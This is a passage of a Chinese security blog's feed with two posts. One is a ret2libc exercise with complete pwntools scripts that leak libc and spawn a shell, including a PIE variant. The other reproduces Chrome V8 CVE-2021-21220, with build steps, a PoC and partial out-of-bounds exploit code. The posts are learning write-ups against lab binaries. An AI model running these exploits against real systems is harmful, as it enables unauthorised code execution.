class=\"string\">&#x27;./nopie.out&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so.6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">vuln_func = <span class=\"number\">0x0804843b</span> //vuln_func</span><br><span class=\"line\"></span><br><span class=\"line\">payload1 = <span class=\"string\">b&quot;A&quot;</span> * <span class=\"number\">140</span> + p32(elf.sym[<span class=\"string\">&#x27;write&#x27;</span>]) + p32(vuln_func) + p32(<span class=\"number\">1</span>) + p32(elf.got[<span class=\"string\">&#x27;write&#x27;</span>]) + p32(<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(payload1)</span><br><span class=\"line\"></span><br><span class=\"line\">write_addr = u32(io.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\">system_addr = write_addr - libc.sym[<span class=\"string\">&#x27;write&#x27;</span>] + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">binsh_addr = write_addr - libc.sym[<span class=\"string\">&#x27;write&#x27;</span>] + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">payload2 = <span class=\"string\">b&quot;B&quot;</span> * <span class=\"number\">140</span> + p32(system_addr) + p32(vuln_func) + p32(binsh_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(payload2)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>书里给的有问题,总感觉少了什么条件,exp跑不通</p>\n<p>[<em>] Switching to int eractive mode<br>[</em>] Got EOF while reading in interactive</p>\n<p>为什么第一个exp不行,这个链接里的就可以??,进行分析</p>\n<p><a href=\"https://blog.csdn.net/weixin_44644249/article/details/113620457\">https://blog.csdn.net/weixin_44644249&#x2F;article&#x2F;details&#x2F;113620457</a></p>\n<p>首先先把payload进行输出</p>\n<p>payload1和2</p>\n<p>b’AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \\x83\\x04\\x08;\\x84\\x04\\x08\\x01\\x00\\x00\\x00\\x14\\xa0\\x04\\x08\\x04\\x00\\x00\\x00’<br>b’BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\\xb0\\xdd\\xd8\\xf7;\\x84\\x04\\x08+\\xeb\\xea\\xf7’</p>\n<p>然后再看成功的</p>\n<p>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaajunk \\x04V\\x04\\x00\\x00 \\x04\\x04\\x00<br>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaajunk°à÷junk+»ò÷</p>\n<p>所以应该是编码问题?? 或者是作者用的python2?? 是python2和3的问题??</p>\n<p>只能说自己太蠢了,(也想吐槽作者写的不好,不该写死的东西干嘛要写死,自己又没给二进制文件)</p>\n<p>当然更重要的是,不能照抄别人的,要对exp的每一行的含义都了如指掌才可以!!!</p>\n<p>作者在exp中给的 vuln_func的地址是写死的,但事实上自己编译的话肯定会有不同,所以需要根据实际情况修改, 或者直接动态获取,不要写死!!!</p>\n<p>0x080484a5 &lt;+26&gt;:\te8 ac ff ff ff\tcall 0x8048456 <vuln_func></vuln_func></p>\n<p>exp修改的部分为vuln_func &#x3D; elf.sym[“vuln_func”] </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&#x27;./nopie.out&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./nopie.out&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so.6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">vuln_func = elf.sym[<span class=\"string\">&quot;vuln_func&quot;</span>] </span><br><span class=\"line\"></span><br><span class=\"line\">payload1 = <span class=\"string\">b&quot;A&quot;</span> * <span class=\"number\">140</span> + p32(elf.sym[<span class=\"string\">&#x27;write&#x27;</span>]) + p32(vuln_func) + p32(<span class=\"number\">1</span>) + p32(elf.got[<span class=\"string\">&#x27;write&#x27;</span>]) + p32(<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(payload1)</span><br><span class=\"line\"></span><br><span class=\"line\">write_addr = u32(io.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\">system_addr = write_addr - libc.sym[<span class=\"string\">&#x27;write&#x27;</span>] + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">binsh_addr = write_addr - libc.sym[<span class=\"string\">&#x27;write&#x27;</span>] + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">payload2 = <span class=\"string\">b&quot;B&quot;</span> * <span class=\"number\">140</span> + p32(system_addr) + p32(vuln_func) + p32(binsh_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(payload2)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"在此基础之上-开启PIE\"><a href=\"#在此基础之上-开启PIE\" class=\"headerlink\" title=\"在此基础之上,开启PIE\"></a>在此基础之上,开启PIE</h1><p>开启了pie后,程序的加载地址就不是固定的0x8048000了,所以直接用elf.sym[“vuln_func”] 是不行的,需要知道是从哪里开始加载的了</p>\n<p>gcc -m32 -fno-stack-protector -z noexecstack -pie -fno-pie dep.c -o pie.out</p>\n<p>patchelf –set-interpreter &#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu11.3_i386&#x2F;ld-linux.so.2 .&#x2F;pie.out<br>patchelf –set-rpath &#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu11.3_i386&#x2F; .&#x2F;pie.out</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">加载的时候,每次地址就不一样了</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0x565555a3</span> &lt;main+<span class=\"number\">17</span>&gt;        call   <span class=\"number\">0x5655556d</span> &lt;vuln_func&gt;</span><br><span class=\"line\"><span class=\"number\">0x5655556d</span> &lt;vuln_func&gt;:\t<span class=\"number\">0x81e58955</span></span><br></pre></td></tr></table></figure>\n\n<p>结果..加载的地址每次还是一样的,经过排查是gdb的问题</p>\n<h2 id=\"为什么gdb调试的时候-它的main的地址是不变的-运行的时候就是变的了\"><a href=\"#为什么gdb调试的时候-它的main的地址是不变的-运行的时候就是变的了\" class=\"headerlink\" title=\"为什么gdb调试的时候,它的main的地址是不变的??? 运行的时候就是变的了????\"></a>为什么gdb调试的时候,它的main的地址是不变的??? 运行的时候就是变的了????</h2><p><a href=\"https://blog.csdn.net/weixin_43350880/article/details/98869099\">https://blog.csdn.net/weixin_43350880&#x2F;article&#x2F;details&#x2F;98869099</a></p>\n<p>因为gdb是默认关闭aslr的,通过在gdb中输入命令aslr on开启,然后每次加载的地址就不一样了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x56630000</span> <span class=\"number\">0x56631000</span> <span class=\"number\">0x000000</span> r-x /home/ubuntu/pwn/pie.out</span><br><span class=\"line\"><span class=\"number\">0x56631000</span> <span class=\"number\">0x56632000</span> <span class=\"number\">0x000000</span> r-- /home/ubuntu/pwn/pie.out</span><br><span class=\"line\"><span class=\"number\">0x56632000</span> <span class=\"number\">0x56633000</span> <span class=\"number\">0x001000</span> rw- /home/ubuntu/pwn/pie.out</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0x56613000</span> <span class=\"number\">0x56614000</span> <span class=\"number\">0x000000</span> r-x /home/ubuntu/pwn/pie.out</span><br><span class=\"line\"><span class=\"number\">0x56614000</span> <span class=\"number\">0x56615000</span> <span class=\"number\">0x000000</span> r-- /home/ubuntu/pwn/pie.out</span><br><span class=\"line\"><span class=\"number\">0x56615000</span> <span class=\"number\">0x56616000</span> <span class=\"number\">0x001000</span> rw- /home/ubuntu/pwn/pie.out</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0x565f3000</span> <span class=\"number\">0x565f4000</span> <span class=\"number\">0x000000</span> r-x /home/ubuntu/pwn/pie.out</span><br><span class=\"line\"><span class=\"number\">0x565f4000</span> <span class=\"number\">0x565f5000</span> <span class=\"number\">0x000000</span> r-- /home/ubuntu/pwn/pie.out</span><br><span class=\"line\"><span class=\"number\">0x565f5000</span> <span class=\"number\">0x565f6000</span> <span class=\"number\">0x001000</span> rw- /home/ubuntu/pwn/pie.out</span><br></pre></td></tr></table></figure>\n\n<p>这样的话,elf.sym[“vuln_func”]  就不能用了,因为有一块随机加载的偏移,需要想办法泄露</p>\n<p>假设我们已经泄露了</p>\n<p> (在dep.c中加入 printf(“main addr: %p”,&amp;main); 但是捏,这个有问题,问题就是哪怕你把它加在了前面,它也是后输出的,这是为什么呢,我们假设的应该是先得到这个地址,然后给vuln_func发送payload</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">int</span> main(<span class=\"built_in\">int</span> argc, char *argv[]) &#123;</span><br><span class=\"line\">        printf(<span class=\"string\">&quot;main addr: %p&quot;</span>,&amp;main);</span><br><span class=\"line\">        vuln_func();</span><br><span class=\"line\">        write(STDOUT_FILENO, <span class=\"string\">&quot;Hello world!\\n&quot;</span>, <span class=\"number\">13</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Hello world!</span><br><span class=\"line\">main addr: <span class=\"number\">0x5658c5d2</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"write\"><a href=\"#write\" class=\"headerlink\" title=\"write\"></a>write</h3><p>这个应该是和缓冲区什么的有关</p>\n<p><a href=\"https://oomake.com/question/2542933\">https://oomake.com/question/2542933</a></p>\n<p>printf带缓冲区,所以要等缓冲区满或者遇到换行符才会输出,write不带缓冲区,直接就输出了</p>\n<p>加一个换行符就可以了</p>\n<p>printf(“main addr: %p\\n”,&amp;main);</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><p>这里假设了会泄漏main的地址,我们加一行代码就直接打印出来了,</p>\n<p>printf(“%p\\n”,&amp;main);</p>\n<p>然后接收main的地址,其他的思路就差不多了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&#x27;./pie.out&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./pie.out&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">main_addr = <span class=\"built_in\">int</span>(io.recvline(), <span class=\"number\">16</span>)</span><br><span class=\"line\">base_addr = main_addr - elf.sym[<span class=\"string\">&#x27;main&#x27;</span>]</span><br><span class=\"line\">vuln_func = base_addr + elf.sym[<span class=\"string\">&#x27;vuln_func&#x27;</span>]</span><br><span class=\"line\">plt_write = base_addr + elf.sym[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\">got_write = base_addr + elf.got[<span class=\"string\">&#x27;write&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">ebx = base_addr + <span class=\"number\">0x2000</span>\t\t\t<span class=\"comment\"># GOT address</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload1 = <span class=\"string\">&quot;A&quot;</span>*<span class=\"number\">132</span> + p32(ebx) + <span class=\"string\">&quot;AAAA&quot;</span> + p32(plt_write) + p32(vuln_func) + p32(<span class=\"number\">1</span>) + p32(got_write) + p32(<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(payload1)</span><br><span class=\"line\"></span><br><span class=\"line\">write_addr = u32(io.recv())</span><br><span class=\"line\">system_addr = write_addr - libc.sym[<span class=\"string\">&#x27;write&#x27;</span>] + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">binsh_addr = write_addr - libc.sym[<span class=\"string\">&#x27;write&#x27;</span>] + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">payload2 = <span class=\"string\">&quot;B&quot;</span> * <span class=\"number\">140</span> + p32(system_addr) + p32(vuln_func) + p32(binsh_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">io.send(payload2)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>如果printf有其他字母呢,怎么接收?</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/",
            "url": "https://tangzichengcc.github.io/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/",
            "title": "CVE-2021-21220 Chrome v8远程代码执行漏洞复现与分析",
            "date_published": "2022-11-17T14:20:59.000Z",
            "content_html": "<h1 id=\"tips\"><a href=\"#tips\" class=\"headerlink\" title=\"tips:\"></a>tips:</h1><p>标记为橙色的为不严谨,有待研究</p>\n<p><img src=\"/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Untitled.png\" alt=\"Untitled\"></p>\n<h1 id=\"V8-漏洞利用之环境搭建\"><a href=\"#V8-漏洞利用之环境搭建\" class=\"headerlink\" title=\"V8 漏洞利用之环境搭建\"></a><strong><strong>V8 漏洞利用之环境搭建</strong></strong></h1><h2 id=\"一、编译环境搭建\"><a href=\"#一、编译环境搭建\" class=\"headerlink\" title=\"一、编译环境搭建\"></a>一、编译环境搭建</h2><p>以下都出自这篇文章:<a href=\"https://zhuanlan.zhihu.com/p/493674086\">https://zhuanlan.zhihu.com/p/493674086</a></p>\n<p>更新软件列表、更新软件、安装依赖</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get upgrade</span><br><span class=\"line\"></span><br><span class=\"line\">sudo apt install bison cdbs curl flex g++ git python vim pkg-config</span><br></pre></td></tr></table></figure>\n\n<p>安装depot_tools</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir /root/tools &amp;&amp; cd /root/tools</span><br><span class=\"line\">git clone https:<span class=\"comment\">//chromium.googlesource.com/chromium/tools/depot_tools.git /root/tools/depot_tools</span></span><br><span class=\"line\">echo <span class=\"string\">&#x27;export PATH=$PATH:&quot;/root/tools/depot_tools&quot;&#x27;</span> &gt;&gt; /etc/profile</span><br><span class=\"line\">echo <span class=\"string\">&#x27;export PATH=$PATH:&quot;/root/tools/depot_tools&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br><span class=\"line\">source /etc/profile</span><br><span class=\"line\">source ~/.bashrc</span><br></pre></td></tr></table></figure>\n\n<p>安装ninja：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https:<span class=\"comment\">//github.com/ninja-build/ninja.git</span></span><br><span class=\"line\">cd ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; cd ..</span><br><span class=\"line\">echo <span class=\"string\">&#x27;export PATH=$PATH:&quot;$(pwd)/ninja&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>\n\n<p>下载v8</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir /root/v8 &amp;&amp; cd /root/v8</span><br><span class=\"line\">fetch v8  #这个可能会花很长时间，取决于个人的网络环境，如果中断了则 gclient sync同步</span><br><span class=\"line\">cd v8</span><br><span class=\"line\">sudo ./build/install-build-deps.sh --no-chromeos-fonts\t# 在linux系统中这个命令是需要的</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"二、找漏洞版本commit\"><a href=\"#二、找漏洞版本commit\" class=\"headerlink\" title=\"二、找漏洞版本commit\"></a>二、找漏洞版本commit</h2><p>编译的话,需要找到漏洞版本的github的commit</p>\n<p>受影响的Chrome最高版本为：<code>89.0.4389.114</code>受影响的V8最高版本为：<code>8.9.255.24</code></p>\n<h3 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h3><p><a href=\"https://omahaproxy.appspot.com/\">https://omahaproxy.appspot.com</a></p>\n<p>通过这个网站可以找漏洞版本的commit</p>\n<p><img src=\"/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Untitled_1.png\" alt=\"Untitled_1\"></p>\n<h3 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h3><p>从漏洞的issue链接<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=821137\">https://bugs.chromium.org/p/chromium/issues/detail?id=821137</a><br>找到修复的commit链接<a href=\"https://chromium.googlesource.com/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d\">https://chromium.googlesource.com/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d</a> ,可以看到漏洞信息、存在漏洞的上一个版本（parent）、diff修复信息和漏洞poc</p>\n<h3 id=\"方法三\"><a href=\"#方法三\" class=\"headerlink\" title=\"方法三\"></a>方法三</h3><p>直接从github找commit</p>\n<p><a href=\"https://github.com/v8/v8/tags?after=8.9.255\">https://github.com/v8/v8/tags?after=8.9.255</a></p>\n<h2 id=\"三、编译\"><a href=\"#三、编译\" class=\"headerlink\" title=\"三、编译\"></a>三、编译</h2><p>分了两个版本,一个是release,一个是debug</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">进入到v8目录,选择好要编译的commit(不然默认编译最新的)</span><br><span class=\"line\">git reset --hard 1dab065bb4025bdd663ba12e2e976c34c3fa6599</span><br><span class=\"line\">gclient sync # 同步更新</span><br><span class=\"line\"># 编译可执行文件 (二选一)</span><br><span class=\"line\">tools/dev/v8gen.py x64.debug</span><br><span class=\"line\">ninja -C out.gn/x64.debug d8</span><br><span class=\"line\">上面和下面是二选一</span><br><span class=\"line\">tools/dev/v8gen.py x64.relase</span><br><span class=\"line\">ninja -C out.gn/x64.relase d8</span><br></pre></td></tr></table></figure>\n\n<p>这里有个坑,就是,debug版本会有很多调试信息,release没有,并且,release不能使用v8的gdb脚本(如job命令),如果想要release能使用gdb脚本的话,需要执行完<code>tools/dev/v8gen.py x64.release</code>后在生成的 <code>out.gn/x64.release/args.gn</code>中追加</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v8_enable_backtrace = <span class=\"literal\">true</span></span><br><span class=\"line\">v8_enable_disassembler = <span class=\"literal\">true</span></span><br><span class=\"line\">v8_enable_object_print = <span class=\"literal\">true</span></span><br><span class=\"line\">v8_enable_verify_heap = <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n\n<p>参考:<a href=\"https://www.cjovi.icu/CVE/1586.html\">https://www.cjovi.icu/CVE/1586.html</a></p>\n<h2 id=\"四、配置v8自带的gdb脚本-方便调试\"><a href=\"#四、配置v8自带的gdb脚本-方便调试\" class=\"headerlink\" title=\"四、配置v8自带的gdb脚本,方便调试\"></a>四、配置v8自带的gdb脚本,方便调试</h2><p>v8自带了gdb调试脚本</p>\n<p><img src=\"/chrome_v8_CVE-2021-21220_%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/Untitled_2.png\" alt=\"Untitled_2\"></p>\n<p>1.把v8&#x2F;tools&#x2F;gdbinit内容加到~&#x2F;.gdbint里面</p>\n<p>2.将v8&#x2F;tools&#x2F;gdb-v8-support.py放到一个目录(当前也行)</p>\n<p>在~&#x2F;.gdbint开头加入 <code>source /自定义目录/gdb-v8-support.py</code></p>\n<p>参考:<a href=\"https://paper.seebug.org/1821/\">https://paper.seebug.org/1821/</a></p>\n<h1 id=\"RCE的完整步骤\"><a href=\"#RCE的完整步骤\" class=\"headerlink\" title=\"RCE的完整步骤\"></a>RCE的完整步骤</h1><h2 id=\"incorrect-numeric-理解漏洞本身\"><a href=\"#incorrect-numeric-理解漏洞本身\" class=\"headerlink\" title=\"incorrect numeric (理解漏洞本身)\"></a>incorrect numeric (理解漏洞本身)</h2><p>POC</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">const</span> _arr = new Uint32Array([<span class=\"number\">2</span>**<span class=\"number\">31</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">function <span class=\"title function_\">foo</span><span class=\"params\">(a)</span> &#123;</span><br><span class=\"line\">    var x = <span class=\"number\">1</span>;</span><br><span class=\"line\">    x = (_arr[<span class=\"number\">0</span>] ^ <span class=\"number\">0</span>) + <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    x = Math.<span class=\"built_in\">abs</span>(x);</span><br><span class=\"line\">    x -= <span class=\"number\">2147483647</span>;</span><br><span class=\"line\">    x = Math.max(x, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    x -= <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(x==<span class=\"number\">-1</span>) x = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    var arr = new Array(x);</span><br><span class=\"line\">    arr.shift();</span><br><span class=\"line\">    var cor = [<span class=\"number\">1.1</span>, <span class=\"number\">1.2</span>, <span class=\"number\">1.3</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> [arr, cor];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://paper.seebug.org/1850/\">https://paper.seebug.org/1850/</a></p>\n<p><a href=\"https://paper.seebug.org/1556/\">https://paper.seebug.org/1556/</a></p>\n<p>那么 这个长度-1的数组有什么用呢??????,见下面 Array.shift</p>\n<h2 id=\"OOB-out-of-bounds-memory-access-越界访问\"><a href=\"#OOB-out-of-bounds-memory-access-越界访问\" class=\"headerlink\" title=\"OOB (out-of-bounds memory access) 越界访问\"></a>OOB (out-of-bounds memory access) 越界访问</h2><p>abusing array bounds check elimination.</p>\n<p>有历史沿革,之前是<a href=\"https://chromium.googlesource.com/v8/v8.git/+/7bb6dc0e06fa158df508bc8997f0fce4e33512a5\">bounds-check elimination</a>的问题,后来去掉了,但又有新的利用方式</p>\n<h3 id=\"利用Array-shift实现oob\"><a href=\"#利用Array-shift实现oob\" class=\"headerlink\" title=\"利用Array.shift实现oob\"></a>利用Array.shift实现oob</h3><p><a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=1198696\">https://bugs.chromium.org/p/chromium/issues/detail?id=1198696</a></p>\n<p>而负长度被视为一个正的大长度,因此该数组允许访问任意 OOB 数据。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function <span class=\"title function_\">foo</span><span class=\"params\">(a)</span> &#123;</span><br><span class=\"line\">        let x = <span class=\"number\">-1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (a) x = <span class=\"number\">0xFFFFFFFF</span>;</span><br><span class=\"line\">        var arr = new Array(Math.sign(<span class=\"number\">0</span> - Math.max(<span class=\"number\">0</span>, x, <span class=\"number\">-1</span>)));<span class=\"comment\">//构造长度为-1的数组</span></span><br><span class=\"line\">        arr.shift();</span><br><span class=\"line\">        let local_arr = Array(<span class=\"number\">2</span>);</span><br><span class=\"line\">        console.<span class=\"built_in\">log</span>(<span class=\"string\">&quot;现在长度&quot;</span>+arr.length)</span><br><span class=\"line\">        local_arr[<span class=\"number\">0</span>] = <span class=\"number\">5.1</span>;<span class=\"comment\">//4014666666666666</span></span><br><span class=\"line\">        let buff = new LeakArrayBuffer(<span class=\"number\">0x1000</span>);<span class=\"comment\">//byteLength idx=8</span></span><br><span class=\"line\">        arr[<span class=\"number\">0</span>] = <span class=\"number\">0x1122</span>; <span class=\"comment\">//</span></span><br><span class=\"line\">        <span 